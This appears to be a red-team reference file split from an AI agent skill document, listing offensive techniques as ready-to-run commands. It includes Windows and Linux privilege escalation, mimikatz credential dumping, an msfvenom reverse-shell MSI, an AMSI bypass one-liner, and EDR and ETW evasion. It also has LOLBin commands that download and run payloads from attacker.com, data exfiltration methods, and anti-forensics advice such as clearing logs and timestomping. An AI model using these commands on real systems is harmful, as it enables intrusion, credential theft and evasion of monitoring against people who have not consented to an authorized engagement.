# red-team-ops — 详细参考（由 SKILL.md 拆分）

# Potato family: JuicyPotato, PrintSpoofer, GodPotato, SweetPotato
PrintSpoofer.exe -i -c "cmd /c whoami"

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Weak service permissions
# sc qc ServiceName → check SERVICE_CHANGE_CONFIG
# Replace binary or modify binpath

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi > shell.msi

# Credential harvesting
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
mimikatz "lsadump::sam"
mimikatz "lsadump::dcsync /user:Administrator"
```

### Linux
```bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null
# GTFOBins for exploitation

# Sudo misconfigurations
sudo -l
# (ALL) NOPASSWD: /usr/bin/vim → :!sh

# Capabilities
getcap -r / 2>/dev/null
# cap_setuid+ep on python3 → python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'

# Kernel exploits
uname -r
# Search exploit-db for kernel version

# Writable /etc/passwd
echo 'root2:$(openssl passwd pass):0:0::/root:/bin/bash' >> /etc/passwd

# Docker escape
# Privileged container: mount host filesystem
# Docker socket exposed: create privileged container
```

## Defense Evasion

### EDR Bypass
```
# Unhooking ntdll.dll
# 1. Map fresh copy of ntdll from disk
# 2. Overwrite .text section of loaded ntdll with clean copy
# 3. Syscalls now bypass EDR hooks

# Direct/Indirect Syscalls
# Skip ntdll entirely — call syscall instruction directly
# Indirect: JMP to syscall;ret inside ntdll (avoids syscall-from-non-ntdll detection)

# ETW Patching
# Patch EtwEventWrite to ret immediately
# Blinds .NET/PowerShell logging

# AMSI Bypass
# Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Process injection techniques:
# - Early bird APC injection
# - Module stomping (overwrite legitimate DLL .text)
# - Thread pool injection
# - Phantom DLL hollowing
```

### Living Off the Land (LOLBins)
```powershell
# Download
certutil -urlcache -split -f http://attacker.com/payload.exe C:\temp\payload.exe
bitsadmin /transfer job /download /priority high http://attacker.com/payload.exe C:\temp\payload.exe
powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')

# Execution
rundll32 payload.dll,EntryPoint
mshta javascript:a=GetObject("script:http://attacker.com/payload.sct")
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
wmic process call create "payload.exe"

# Lateral movement
wmic /node:TARGET process call create "cmd /c payload"
winrs -r:TARGET cmd
```

## Data Exfiltration

```bash
# DNS exfiltration (slow but stealthy)
# Encode data in subdomain queries: base64chunk.attacker.com

# HTTPS to legitimate services
# Upload to paste sites, cloud storage, code repos

# Steganography
# Hide data in images/documents

# Chunked transfer over time
# Mimic normal traffic patterns, respect business hours
```

## OPSEC Considerations

- Timestamp stomping on dropped files
- Clear event logs selectively (not wholesale — that's suspicious)
- Use legitimate admin tools when possible
- Match C2 beacon timing to normal traffic patterns
- Avoid scanning from compromised hosts (use pivot tools)
- Rotate infrastructure regularly
- Use separate infrastructure for different engagement phases
